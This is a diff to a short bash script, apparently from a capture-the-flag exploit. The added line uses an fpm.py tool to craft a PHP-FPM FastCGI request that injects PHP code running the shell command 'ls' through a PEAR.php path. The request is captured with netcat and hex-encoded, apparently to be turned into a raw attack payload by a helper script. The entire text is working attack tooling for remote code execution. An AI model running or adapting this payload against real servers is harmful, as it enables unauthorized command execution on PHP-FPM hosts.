@@ -1,5 +1,5 @@
 #!/bin/bash
-nc -l 9000 > 1.txt
+python fpm.py 127.0.0.1 -p 9000 /usr/local/lib/php/PEAR.php -c '<?php echo `ls`; exit;?>' | nc -l 9000 > 1.txt
 xxd -p 1.txt > hex.txt
 python3 1.py
 rm 1.txt hex.txt
